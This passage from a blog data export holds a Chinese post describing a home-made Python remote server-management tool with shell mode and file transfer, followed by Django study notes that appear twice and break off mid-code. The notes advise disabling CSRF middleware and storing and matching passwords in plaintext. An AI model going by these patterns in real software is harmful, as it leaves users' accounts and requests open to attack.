title=\"创作思想（创作背景、目的和意义）\"></a>创作思想（创作背景、目的和意义）</h3><p>作者是一名网络安全与计算机的爱好者,经常折腾云服务器、研究主机控制等内容.迫于经典的云服务器只具有命令行界面,且每次都需要使用ssh登陆,十分的低效且麻烦.开发本程序.<br>本程序针对服务器设计,以高效的(云)主机管理为目标,以安全的数据传输为基础,以强大的稳定性与高技术含量为宗旨,编写了此款软件.集成了密码登陆、加密传输、文件上传/下载、命令执行、会话交流等功能.<br>采用python3.8编程.本程序虽使用命令行进行控制,但创新的虚拟交互终端使操作控制十分便捷,并且具有持续管理能力.会话存储功能使每一次登陆都十分便捷.</p>\n<h3 id=\"创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\"><a href=\"#创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\" class=\"headerlink\" title=\"创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）\"></a>创作过程（运用了哪些技术或技巧完成主题创作，哪些是得意之处）</h3><p>本作品技术含量极高,运用python中的许多高级语法:</p>\n<h4 id=\"1-类的思想、封装与接口\"><a href=\"#1-类的思想、封装与接口\" class=\"headerlink\" title=\"1.类的思想、封装与接口\"></a>1.类的思想、封装与接口</h4><p>自定义的会话类,内部维护了socket实例.自动检测socket状态进行删除与提示.<br>在内部根据会话类型进行不同的初始化.向外部提供了封装过的管理函数.</p>\n<h4 id=\"2-会话存储\"><a href=\"#2-会话存储\" class=\"headerlink\" title=\"2.会话存储\"></a>2.会话存储</h4><p>对于如上的会话类,本程序结合了IO操作与网络编程,将会话信息以JSON格式保存在本地,以方便下次直接连接服务器.简化了程序的操作流程,减小了使用难度.</p>\n<h4 id=\"3-多线程处理\"><a href=\"#3-多线程处理\" class=\"headerlink\" title=\"3.多线程处理\"></a>3.多线程处理</h4><p>同时持有多个会话,每一个会话单独创建一个线程进行管理,互不干扰.</p>\n<h4 id=\"4-socket网络编程\"><a href=\"#4-socket网络编程\" class=\"headerlink\" title=\"4.socket网络编程\"></a>4.socket网络编程</h4><p>使用TCP进行传输.Socket可以说是本程序的精髓所在,对socket的状态、内容、信息进行处理,建立可靠灵活的socket管理,并对各种情况进行处理,适应各种网络环境.</p>\n<h4 id=\"5-异常处理\"><a href=\"#5-异常处理\" class=\"headerlink\" title=\"5.异常处理\"></a>5.异常处理</h4><p>程序因涉及到网络,故异常与突发状况较多.故采用多级分类的异常处理模块,对不同类型的异常进行不同的处理,对症下药,增加了程序的健壮性.</p>\n<h4 id=\"6-指令性\"><a href=\"#6-指令性\" class=\"headerlink\" title=\"6.指令性\"></a>6.指令性</h4><p>对于复杂而多种多样的操作,每一条信息都归属于一个大的操作模块,而不同的操作有不同的执行.每条指令都以[EOF]结尾,并与封装性结合,提供读取接口,在编码时十分方便.</p>\n<h4 id=\"7-编码自适应-转换\"><a href=\"#7-编码自适应-转换\" class=\"headerlink\" title=\"7.编码自适应/转换\"></a>7.编码自适应/转换</h4><p>跨平台可以说是所有软件都无法避免的一个难题.对于windows常用的gbk与linux广泛使用的utf-8两种编码,本程序拥有编码自适应的功能,不用害怕跨平台乱码了!</p>\n<h4 id=\"8-加密-amp-解密\"><a href=\"#8-加密-amp-解密\" class=\"headerlink\" title=\"8.加密&amp;解密\"></a>8.加密&amp;解密</h4><p>本程序不但拥有逻辑上的登陆密码,还有物理传输层面的加密.对于每一个会话都会生成一个独一无二的密钥进行加密,每一次传输都会先进行加密,在接收端再进行解密,避免了传输过程中的信息泄露或中间人攻击,极大地增强了安全性</p>\n<h4 id=\"9-DEBUG模式\"><a href=\"#9-DEBUG模式\" class=\"headerlink\" title=\"9.DEBUG模式\"></a>9.DEBUG模式</h4><p>本程序共有900余行代码,按理来说维护十分困难.万幸,本程序提供了DEBUG模式,对于各部分的错误与信息进行输出与调试,极大减少了二次开发的成本.</p>\n<h4 id=\"10-多操作系统自适应\"><a href=\"#10-多操作系统自适应\" class=\"headerlink\" title=\"10.多操作系统自适应\"></a>10.多操作系统自适应</h4><p>此优势与第(7)条有异曲同工之妙.程序会自动根据当前的操作系统,进行相应的自适应操作,增加了跨平台的能力.</p>\n<h4 id=\"11-虚拟终端\"><a href=\"#11-虚拟终端\" class=\"headerlink\" title=\"11.虚拟终端\"></a>11.虚拟终端</h4><p>交互式的虚拟终端,模仿shell进行改进,极大增强了用户的操作手感.与此同时,本程序配有完善的信息提示系统,随时告知使用者当前事件.其中提供了些许自定义的功能指令,但却没有过多地增加原版shell的内容,可加以改进.<br>12.命令行参数获取<br>如上,本程序虽提供了虚拟终端,但为了方便外部脚本的调用,本程序也提供了必要的参数,增强了与外界的交流性.</p>\n<h4 id=\"13-动态类调用\"><a href=\"#13-动态类调用\" class=\"headerlink\" title=\"13.动态类调用\"></a>13.动态类调用</h4><p>对于如上的虚拟终端,本程序使用了动态类调用的技术,极大地减少了代码的冗余度,增加了代码效率,遵守了了python程序的设计理念(python之禅)</p>\n<h4 id=\"14-MVC设计模式\"><a href=\"#14-MVC设计模式\" class=\"headerlink\" title=\"14.MVC设计模式\"></a>14.MVC设计模式</h4><p>Model、View、Controller.此理念源自Java的学习中,结合了面向对象的思想.会话类则是其中的Model封装了对外的接口.View则是强大的提示系统、DEBUG模式与编码系统,对各种信息进行处理输出.Controller是本程序中的holder函数.对各种指令进行集中操作与管理.</p>\n<h3 id=\"原创部分\"><a href=\"#原创部分\" class=\"headerlink\" title=\"原创部分\"></a>原创部分</h3><p>虚拟终端、指令性传输、传输加密、DEBUG模式、编码自适应、会话存储、操作系统自适应.</p>\n<h3 id=\"参考资源（参考或引用他人资源及出处）\"><a href=\"#参考资源（参考或引用他人资源及出处）\" class=\"headerlink\" title=\"参考资源（参考或引用他人资源及出处）\"></a>参考资源（参考或引用他人资源及出处）</h3><p>《Python黑帽子编程》</p>\n<h3 id=\"制作用软件及运行环境\"><a href=\"#制作用软件及运行环境\" class=\"headerlink\" title=\"制作用软件及运行环境\"></a>制作用软件及运行环境</h3><p>MacOs PyCharm<br>Python3.8<br>跨平台</p>\n<h3 id=\"其他说明（需要特别说明的问题）\"><a href=\"#其他说明（需要特别说明的问题）\" class=\"headerlink\" title=\"其他说明（需要特别说明的问题）\"></a>其他说明（需要特别说明的问题）</h3><h4 id=\"1-建议密码不要设置为中文-在文件传输时会有问题\"><a href=\"#1-建议密码不要设置为中文-在文件传输时会有问题\" class=\"headerlink\" title=\"1.建议密码不要设置为中文,在文件传输时会有问题.\"></a>1.建议密码不要设置为中文,在文件传输时会有问题.</h4><h4 id=\"2-请使用Python3运行此脚本-请注意终端的编码模式\"><a href=\"#2-请使用Python3运行此脚本-请注意终端的编码模式\" class=\"headerlink\" title=\"2.请使用Python3运行此脚本.请注意终端的编码模式\"></a>2.请使用Python3运行此脚本.请注意终端的编码模式</h4><h4 id=\"3-上传-下载文件请不要选择大文件进行测试-内存会溢出\"><a href=\"#3-上传-下载文件请不要选择大文件进行测试-内存会溢出\" class=\"headerlink\" title=\"3.上传/下载文件请不要选择大文件进行测试,内存会溢出.\"></a>3.上传/下载文件请不要选择大文件进行测试,内存会溢出.</h4><p>默认监听端口:33445</p>\n<h3 id=\"1-命令行参数\"><a href=\"#1-命令行参数\" class=\"headerlink\" title=\"1.命令行参数\"></a>1.命令行参数</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usage:</span><br><span class=\"line\"><span class=\"code\">        -h,--help   --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        -t,--target --&gt;  设置目标主机地址</span></span><br><span class=\"line\"><span class=\"code\">        -p,--port   --&gt;  设置目标主机端口</span></span><br><span class=\"line\"><span class=\"code\">        -l,--listen --&gt;  开启监听模式</span></span><br><span class=\"line\"><span class=\"code\">        -d,--debug  --&gt;  开启debug模式</span></span><br><span class=\"line\"><span class=\"code\">        -k,--key    --&gt;  设置登陆密码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-服务端交互命令\"><a href=\"#2-服务端交互命令\" class=\"headerlink\" title=\"2.服务端交互命令\"></a>2.服务端交互命令</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">服务端使用说明:</span><br><span class=\"line\"><span class=\"code\">        help          --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        disconnect,disc  --&gt;  断开连接</span></span><br><span class=\"line\"><span class=\"code\">        session       --&gt;  会话管理</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list    --&gt;   列出所有会话</span></span><br><span class=\"line\"><span class=\"code\">                -c,--change  --&gt;   更改持有会话</span></span><br><span class=\"line\"><span class=\"code\">        mode          --&gt;  更改模式</span></span><br><span class=\"line\"><span class=\"code\">                -t,--talk    --&gt;   对话模式</span></span><br><span class=\"line\"><span class=\"code\">        key           --&gt;  登陆密码管理</span></span><br><span class=\"line\"><span class=\"code\">                -s,--set   --&gt;    设置密码</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list  --&gt;    显示密码</span></span><br><span class=\"line\"><span class=\"code\">                -c,--close --&gt;    关闭密码登陆(无需密码登录)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-客户端交互命令\"><a href=\"#3-客户端交互命令\" class=\"headerlink\" title=\"3.客户端交互命令\"></a>3.客户端交互命令</h3><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端使用说明:</span><br><span class=\"line\"><span class=\"code\">        help          --&gt;  帮助</span></span><br><span class=\"line\"><span class=\"code\">        disconnect,disc      --&gt;  断开连接</span></span><br><span class=\"line\"><span class=\"code\">                -i,--id         --&gt;  选择要断开的会话id(默认为当前持有会话)</span></span><br><span class=\"line\"><span class=\"code\">        backgroud,bg  --&gt;  后台模式</span></span><br><span class=\"line\"><span class=\"code\">        session       --&gt;  会话管理</span></span><br><span class=\"line\"><span class=\"code\">                -l,--list    --&gt;   列出所有会话</span></span><br><span class=\"line\"><span class=\"code\">                -c,--change  --&gt;   更改持有会话</span></span><br><span class=\"line\"><span class=\"code\">        mode          --&gt;  更改模式</span></span><br><span class=\"line\"><span class=\"code\">                -t,--talk    --&gt;    对话模式</span></span><br><span class=\"line\"><span class=\"code\">                -s,--shell   --&gt;    shell模式</span></span><br><span class=\"line\"><span class=\"code\">        connect     --&gt;  连接到远程主机</span></span><br><span class=\"line\"><span class=\"code\">                -t,--target     --&gt;   设置目标主机地址 (默认为--127.0.0.1)</span></span><br><span class=\"line\"><span class=\"code\">                -p,--port       --&gt;   设置目标主机端口 (默认为-33445)</span></span><br><span class=\"line\"><span class=\"code\">                -P,--password   --&gt;   使用密码登陆目标主机</span></span><br><span class=\"line\"><span class=\"code\">        upload   `FILENAME` --&gt;   上传文件</span></span><br><span class=\"line\"><span class=\"code\">        download `FILENAME` --&gt;   下载文件</span></span><br></pre></td></tr></table></figure>\n\n\n\n"},{"title":"django学习","date":"2021-04-04T02:58:30.000Z","_content":"# django学习\n\n\n\n#### Web基本概念——前置\n\n##### socket 套接字\n\n位于应用层与传输层之间的虚拟层,通过此接口进行数据传输等操作\n\n##### c/s 架构\n\n即client/server架构,通过客户端程序与服务端通信\n\n##### b/s 架构\n\n即browser/server架构,通过浏览器发送http请求,获得服务器的资源\n\n便捷、通用\n\n##### 请求过程\n\n###### 0.socket服务端 绑定/监听\n\n​\t0.0 导入socket库\n\n```python\nimport socket\n```\n\n​\t0.1 创建socket服务端 \t\n\n```python\nserver = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n# socket.AF_INET 表示使用ipv4\n# socket.SOCK_STREAM 表示使用tcp\n```\n\n​\t0.2 绑定到本地端口\n\n```python\nsocket.bind(('127.0.0.1',8080))\n# target与port要以元组的形势传入\n```\n\n​\t0.3 开启监听\n\n```python\nsocket.listen(5)\n# 设置最大连接数\n```\n\n​\t0.4 等待连接\n\n```python\nwhile True:\n\tso,addr = socket.accept()\n  # 返回连接socket与客户端地址\n```\n\n###### 1.socket客户端 连接\n\n​\t0.1 创建socket客户端\n\n```python\nclient = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n```\n\n​\t0.2 连接服务端\n\n```python\nclient.connect((target,port))\n```\n\n###### 2.双方传输数据\n\n```python\ndata = server.recv(1024)\nclient.send(b'')\n```\n\n###### 3.处理请求、发送内容\n\n###### 4.重复到 2 \n\n###### 5.断开连接\n\n##### HTTP\n\n###### Hyper Text Transfer Protocol 超文本传输协议\n\n###### 推荐书籍:《http权威指南》\n\n###### Web中作为请求与响应的标准\n\n请求: 请求行 请求头请求数据\n\n![](https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001733298-201433635.jpg)\n\n```http\nGET / HTTP/1.1\nHost: 127.0.0.1:8800\nConnection: keep-alive\nsec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: hblid=LXa5cZvOpVbu5wDe3m39N0HIgrB8BFbo; csrftoken=NQ2jvGjSCUXBQsAU0TgOCoop939FrKCBhyPS7jAgHBlTEtpqgLOvOjZqirQ0gjeQ; security_level=0\n\\r\\n\n```\n\n响应: 状态行 响应头部 响应数据\n\n![](https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001744323-654009411.jpg)\n\n###### http默认端口80,https默认端口443\n\n###### 响应码\n\n1xx消息 请求已被服务器接收,继续处理\n\n2xx成功 请求已成功被服务器接收、理解并接受\n\n​\t200 成功\n\n3xx重定向 需要后续操作才能完成此请求\n\n4xx请求错误 客户端请求含有错误或无法执行\n\n​\t403 客户端访问权限不足\n\n​\t404 客户端请求资源不存在\n\n5xx服务器错误 服务器在处理正确请求时发生错误\n\n###### 请求方法\n\nGET、HEAD、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT\n\n###### URL\n\n统一资源定位符,用于从互联网获取信息\n\n*Protocol://Domain:Port/Path?Key1=Value1#Part*\n\n#### django——正文\n\n##### 下载\n\n`pip3 install django -i https://pypi.tsinghua.edu.cn/simple`\n\n##### 创建项目\n\n`django-admin startproject PROJECT_NAME`\n\n[^注意]: 需要在settings中更改DIRS路径(Template)\n\n或在professional pycharm中创建Django项目\n\n[^注意]: pycharm创建django3项目时,需要在settings.py中加上import os\n\n##### 项目目录\n\n#####  |── djangoStudy  项目文件夹\n\n#####  │    |── __init__.py\n│    |── asgi.py\n│    |── settings.py 配置\n│    |── urls.py 路由 -> URL和函数的对应关系\n |     |── wsgi.py runserver命令使用wsgiref模块当作简单的webserver\n |── manage.py\n |── templates\n\n##### 启动项目\n\n`python3 manage.py runserver [[ip:]port]`\n\nPycharm执行manage.py\n\n##### 编写页面\n\n```python\nfrom django.shortcuts import HttpResponse, render\ndef index(request):\n\n    # return HttpResponse('index') # 返回字符串\n    return render(request, 'index.html')  # 返回页面\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('index/', index),\n]\n```\n\n##### 逻辑处理\n\n###### request类\n\n*METHOD* 请求方法\n\n​\t*GET&POST*\n\n*GET字典&POST字典*\n\n​\t`POST.get('Key') `获得提交的参数\n\n###### redirect类\n\n```python\nfrom django.shortcuts import redirect\ndef login(request):\n  if True:\n    return redirect(PATH)\n```\n\n重定向\n\n##### 创建app\n\n###### 生成app\n\n`django-admin startapp APP_NAME`\n\n.\n |── __init__.py\n |── admin.py 管理后台\n |── apps.py app\n |── migrations\n |    |── __init__.py\n |── models.py 数据库\n |── tests.py\n |── views.py 函数\n\n###### 安装(注册)app\n\n```python\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    # 'app1',\n    'app1.apps.App1Config',  # 推荐\n]\n```\n\n##### app使用\n\n###### views.py\n\n将函数放在此文件内\n\n同时更改urls.py\n\n```python\nfrom app1 import views\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('login/', views.login),\n    path('login2/', views),\n    path('index/', views.index)\n]\n```\n\n##### models.py\n\n###### Orm\n\n对象关系映射\n\n将对象与一张表一一对应,便捷\n\n操作有限、牺牲执行效率\n\n###### models\n\n1.在settings.py中设置数据库驱动\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n```\n\n2.在models.py中定义orm的关系\n\n类 -> 表\n\n对象 -> 数据行(记录)\n\n属性 -> 字段\n\n```python\nclass User(models.Model):  # 定义一张表，继承Model类\n    username = models.CharField(max_length=32)  # varchar(32)\n    password = models.CharField(max_length=32)\n```\n\n3.`python3 manage.py makemigrations` 检测所有app有什么变化,制作迁移文件\n\n4.`python3 manage.py migrate  ` 根据迁移文件,将变更迁移到数据库\n\n##### 数据库查询\n\n```python\nfrom app1 import models\n# models.User.objects.get(username=user, password=pwd)\n# 当get函数查询无结果或有多个结果时会报错\n# 建议使用filter\nmodels.User.objects.all().orderby('-id')#按照id字段逆序排列\nif models.User.objects.filter(username=user, password=pwd):\n  pass\n```\n\n##### 数据库增加\n\n```python\nfrom app1 import models\nmodels.User.objects.create(name=name)\n```\n\n##### 数据库删除\n\n```python\nfrom app1 import models\nmodels.User.objects.get(id=id).delete()\n```\n\n##### 数据库修改\n\n```python\np = models.User.objects.filter(id=request.POST.get('id'))[0]\np.name = 'xxx'\np.save()\n```\n\n\n\n##### 修改数据库为mysql\n\n1.创建mysql数据库\n\n2.修改settings.py\n\n\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.mysql',\n        'NAME': 'login',\n        'HOST': 'localhost',\n        'PORT': 3306,\n        'USER': 'xxx',\n        'PASSWORD': 'xxx',\n    }\n}\nimport pymysql\npymysql.install_as_MySQLdb()\n\n```\n\n3.写model\n\n4.执行数据库迁移\n\n`python3 manage.py makemigrations`\n\n`Python3 manage.py migrate`\n\n##### 模糊语法\n\n```html\n<table border=\"1\">\n        <thead>\n        <tr>\n            <th>序号</th>\n            <th>id</th>\n            <th>name</th>\n        </tr>\n        </thead>\n        <tbody>\n        {% for i in p_list %}\n        <tr>\n            <td>{{ forloop.counter }}</td>\n            <td>{{ i.id }}</td>\n            <td>{{ i.name }}</td>\n        </tr>\n        {% endfor %}\n        </tbody>\n    </table>\n```\n\n\n\n```python\nreturn render(request, 'lists.html', context={'p_list': lists})\n```\n\n\n\n#### Django相关的命令 \n\n##### 1.下载安装\n\n`Pip3 install diango`创建 diango项目\n\n`django-admin startproject`项目名称 启动项目\n\n###### 切换到项目的根目录\n\n`python3 manage. py runserver [127.0.0.1[:8000]]`运行服务\n\n###### 创建app\n\n`python3 manage. py startapp app`    名称 数据库迁移的命令\n\n`python manage. py makemigrations` 检测app下的 model.py的变化记录下变更记录 \n\n`python manage. py migrate` 迁移将变更记录同步到数据库中\n\n##### 2.settings配置\n\n​\tBASE_DIR 项目的根目录\n\n​\tINSTALLED_APPS 注册的app\n\n​\tMIDDLEWARE 中间件\n\n​\t\t注释CSRF保护,可以提交POST请求\n\n​\tTEMPLATES模板\n\n​\t\tDIRS: [os.path.join(BASE_DIR, 'templates')] \n\n​\t静态文件\n\n​\t\tSTATIC_URL = '/static/' 静态文件的别名\n\n​\t\tSTATICFILES_DIRS = [\n\nBASE_DIR, 'static')\t\t\t\t\n\n​\t\t\t\t]\n\n##### \t3.django使用mysql\n\n###### \t\t1.创建mysql数据库\n\n###### \t\t2.配置settings\n\n​\t\t\t\n\n```python\nDATABASES\nENGINE django.db.backends.mysql\nNAME 数据库名\nHOST IP地址\nPORT 3306\nUSER 用户名\nPASSWORD 密码\n```\n\n###### 3.使用pymysql模块连接mysql数据库\n\n建议写在\\_\\_init\\_\\_.py中\n\n```python\nimport pymysql\npymysql.install_as_MySQLdb()\n```\n\n###### 4.在app的models.py写入model(models.model)\n\n```\nfrom django import models\nclass User(models.Model):\n\tusername = models.CharField(max_length=32)\n```\n\n###### 5.迁移至数据库\n\n```\npython3 manage.py makemigrations\npython3 manage.py migrate\n```\n\n##### 4.urls.py 路径与函数对应关系\n\n```python\nfrom app1 import views\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('list/', views.p_list),\n    path('create/', views.create),\n    path('delete/', views.delete),\n    path('edit/', views.edit)\n]\n```\n\n##### 5.函数\n\n```python\ndef xxx(request):\n\trequest.method  # 请求方式\n\trequest.POST  # post传输的参数\n  return\n\t# render(request, 'login.html', context={'info': 'Success'})  渲染并返回HTML页面\n  # HttpResponse('字符串')\n  # redirect('/index') \n```\n\n##### 6.ORM\n\n对象关系映射\n\n类 -> 表\n\n对象 -> 数据行\n\n属性 -> 字段\n\n###### 查询\n\n```python\nfrom app1 import models\nmodels.User.objects.all()\nmodels.User.object.get(id=1)\nmodels.User.object.filter(id=1,name='x')\n```\n\n###### 增加\n\n```python\nmodels.User.objects.create(name='123')\n```\n\n###### 删除\n\n```python\nmodels.User.objects.get(id=1).delete()\nmodels.User.objects.filter(id=1).delete()\n```\n\n###### 修改\n\n```python\nobj = models.User.objects.get(id=1)\nobj.name = 'xxx'\nobj.save()\n```\n\n##### 7.模版语法\n\n```\nreturn render(request, 'filename.html', context={'k':'1'})\n返回并渲染一个html页面\n```\n\n```\n{{  k1  }}  # 替换内容\n\n{%  for i in K  %}\n\t{{  forloop.counter. }}\n\t{{ i.name  }}\n{%  endfor  %}\n```\n\n","source":"_posts/django学习笔记.md","raw":"---\ntitle: django学习\ndate: 2021-04-04 10:58:30\ntags: 编程\n---\n# django学习\n\n\n\n#### Web基本概念——前置\n\n##### socket 套接字\n\n位于应用层与传输层之间的虚拟层,通过此接口进行数据传输等操作\n\n##### c/s 架构\n\n即client/server架构,通过客户端程序与服务端通信\n\n##### b/s 架构\n\n即browser/server架构,通过浏览器发送http请求,获得服务器的资源\n\n便捷、通用\n\n##### 请求过程\n\n###### 0.socket服务端 绑定/监听\n\n​\t0.0 导入socket库\n\n```python\nimport socket\n```\n\n​\t0.1 创建socket服务端 \t\n\n```python\nserver = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n# socket.AF_INET 表示使用ipv4\n# socket.SOCK_STREAM 表示使用tcp\n```\n\n​\t0.2 绑定到本地端口\n\n```python\nsocket.bind(('127.0.0.1',8080))\n# target与port要以元组的形势传入\n```\n\n​\t0.3 开启监听\n\n```python\nsocket.listen(5)\n# 设置最大连接数\n```\n\n​\t0.4 等待连接\n\n```python\nwhile True:\n\tso,addr = socket.accept()\n  # 返回连接socket与客户端地址\n```\n\n###### 1.socket客户端 连接\n\n​\t0.1 创建socket客户端\n\n```python\nclient = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n```\n\n​\t0.2 连接服务端\n\n```python\nclient.connect((target,port))\n```\n\n###### 2.双方传输数据\n\n```python\ndata = server.recv(1024)\nclient.send(b'')\n```\n\n###### 3.处理请求、发送内容\n\n###### 4.重复到 2 \n\n###### 5.断开连接\n\n##### HTTP\n\n###### Hyper Text Transfer Protocol 超文本传输协议\n\n###### 推荐书籍:《http权威指南》\n\n###### Web中作为请求与响应的标准\n\n请求: 请求行 请求头请求数据\n\n![](https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001733298-201433635.jpg)\n\n```http\nGET / HTTP/1.1\nHost: 127.0.0.1:8800\nConnection: keep-alive\nsec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: hblid=LXa5cZvOpVbu5wDe3m39N0HIgrB8BFbo; csrftoken=NQ2jvGjSCUXBQsAU0TgOCoop939FrKCBhyPS7jAgHBlTEtpqgLOvOjZqirQ0gjeQ; security_level=0\n\\r\\n\n```\n\n响应: 状态行 响应头部 响应数据\n\n![](https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001744323-654009411.jpg)\n\n###### http默认端口80,https默认端口443\n\n###### 响应码\n\n1xx消息 请求已被服务器接收,继续处理\n\n2xx成功 请求已成功被服务器接收、理解并接受\n\n​\t200 成功\n\n3xx重定向 需要后续操作才能完成此请求\n\n4xx请求错误 客户端请求含有错误或无法执行\n\n​\t403 客户端访问权限不足\n\n​\t404 客户端请求资源不存在\n\n5xx服务器错误 服务器在处理正确请求时发生错误\n\n###### 请求方法\n\nGET、HEAD、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT\n\n###### URL\n\n统一资源定位符,用于从互联网获取信息\n\n*Protocol://Domain:Port/Path?Key1=Value1#Part*\n\n#### django——正文\n\n##### 下载\n\n`pip3 install django -i https://pypi.tsinghua.edu.cn/simple`\n\n##### 创建项目\n\n`django-admin startproject PROJECT_NAME`\n\n[^注意]: 需要在settings中更改DIRS路径(Template)\n\n或在professional pycharm中创建Django项目\n\n[^注意]: pycharm创建django3项目时,需要在settings.py中加上import os\n\n##### 项目目录\n\n#####  |── djangoStudy  项目文件夹\n\n#####  │    |── __init__.py\n│    |── asgi.py\n│    |── settings.py 配置\n│    |── urls.py 路由 -> URL和函数的对应关系\n |     |── wsgi.py runserver命令使用wsgiref模块当作简单的webserver\n |── manage.py\n |── templates\n\n##### 启动项目\n\n`python3 manage.py runserver [[ip:]port]`\n\nPycharm执行manage.py\n\n##### 编写页面\n\n```python\nfrom django.shortcuts import HttpResponse, render\ndef index(request):\n\n    # return HttpResponse('index') # 返回字符串\n    return render(request, 'index.html')  # 返回页面\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('index/', index),\n]\n```\n\n##### 逻辑处理\n\n###### request类\n\n*METHOD* 请求方法\n\n​\t*GET&POST*\n\n*GET字典&POST字典*\n\n​\t`POST.get('Key') `获得提交的参数\n\n###### redirect类\n\n```python\nfrom django.shortcuts import redirect\ndef login(request):\n  if True:\n    return redirect(PATH)\n```\n\n重定向\n\n##### 创建app\n\n###### 生成app\n\n`django-admin startapp APP_NAME`\n\n.\n |── __init__.py\n |── admin.py 管理后台\n |── apps.py app\n |── migrations\n |    |── __init__.py\n |── models.py 数据库\n |── tests.py\n |── views.py 函数\n\n###### 安装(注册)app\n\n```python\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    # 'app1',\n    'app1.apps.App1Config',  # 推荐\n]\n```\n\n##### app使用\n\n###### views.py\n\n将函数放在此文件内\n\n同时更改urls.py\n\n```python\nfrom app1 import views\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('login/', views.login),\n    path('login2/', views),\n    path('index/', views.index)\n]\n```\n\n##### models.py\n\n###### Orm\n\n对象关系映射\n\n将对象与一张表一一对应,便捷\n\n操作有限、牺牲执行效率\n\n###### models\n\n1.在settings.py中设置数据库驱动\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n```\n\n2.在models.py中定义orm的关系\n\n类 -> 表\n\n对象 -> 数据行(记录)\n\n属性 -> 字段\n\n```python\nclass User(models.Model):  # 定义一张表，继承Model类\n    username = models.CharField(max_length=32)  # varchar(32)\n    password = models.CharField(max_length=32)\n```\n\n3.`python3 manage.py makemigrations` 检测所有app有什么变化,制作迁移文件\n\n4.`python3 manage.py migrate  ` 根据迁移文件,将变更迁移到数据库\n\n##### 数据库查询\n\n```python\nfrom app1 import models\n# models.User.objects.get(username=user, password=pwd)\n# 当get函数查询无结果或有多个结果时会报错\n# 建议使用filter\nmodels.User.objects.all().orderby('-id')#按照id字段逆序排列\nif 